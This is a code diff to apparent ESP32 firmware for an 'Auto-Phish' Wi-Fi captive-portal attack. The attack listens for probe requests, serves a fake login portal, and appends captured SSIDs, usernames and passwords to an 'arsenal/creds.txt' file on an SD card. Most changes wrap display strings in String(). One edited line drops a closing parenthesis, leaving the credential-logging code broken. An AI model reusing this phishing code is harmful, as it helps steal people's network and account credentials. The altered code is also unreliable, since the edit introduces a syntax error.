@@ -89,7 +89,7 @@ button{width:100%;padding:14px;background:#007AFF;color:#fff;border:none;border-
 
 static void logPhishCred(String ssid, String user, String pass) {
     if (setupSdCard()) {
-        if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
+        if (!SD.exists("/arsenal") SD.mkdir("/arsenal");
         File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
         if (f) {
             f.printf("[%lu] AutoPhish SSID:%s | User:%s | Pass:%s\n",
@@ -115,8 +115,8 @@ void arsenal_captive_portal_autophish(void) {
         drawMainBorderWithTitle("Auto-Phish");
         tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
         tft.setTextSize(FP);
-        tft.drawCentreString("Listening for probe requests...", tftWidth / 2, tftHeight / 2 - 10, 1);
-        tft.drawCentreString("Sel to continue", tftWidth / 2, tftHeight / 2 + 10, 1);
+        tft.drawCentreString(String("Listening for probe requests..."), tftWidth / 2, tftHeight / 2 - 10, 1);
+        tft.drawCentreString(String("Sel to continue"), tftWidth / 2, tftHeight / 2 + 10, 1);
 
 
         int ch = 1;
@@ -220,7 +220,7 @@ void arsenal_captive_portal_autophish(void) {
             tft.printf("Creds captured: %d", phishCredsCapture);
 
             tft.setTextColor(TFT_RED, bruceConfig.bgColor);
-            tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);
+            tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 20, 1);
 
             if (check(EscPress)) break;
             esp_task_wdt_reset();
